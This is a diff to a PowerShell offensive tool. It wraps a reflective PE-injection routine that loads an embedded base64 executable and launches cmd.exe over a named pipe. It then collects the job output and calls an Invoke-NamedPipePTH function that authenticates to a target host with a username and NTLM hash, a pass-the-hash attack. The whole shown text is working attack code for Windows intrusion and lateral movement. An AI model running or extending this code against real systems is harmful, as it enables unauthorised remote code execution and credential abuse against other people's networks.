@@ -1754,6 +1754,13 @@ param
     [String]$PipeName
 )
 
+function onlytogettheoutput{
+
+param
+(
+    [String]$binary = "C:\windows\system32\cmd.exe",
+    [String]$PipeName
+)
 function Invoke-PEInjection
 {
 <#
@@ -4670,9 +4677,11 @@ $executable86 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  }
 
  Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "-e $binary -p $PipeName"
- 
- } -ArgumentList $binary,$Pipename
- Sleep 3
+ }
+ onlytogettheoutput -binary $binary -PipeName $PipeName
+
+ } -ArgumentList $binary,$Pipename | wait-job | receive-job
+ Sleep 4
 
  Invoke-NamedPipePTH -Username $Username -Hash $Hash -Target $Target -Domain $domain -PipeName $PipeName
  }
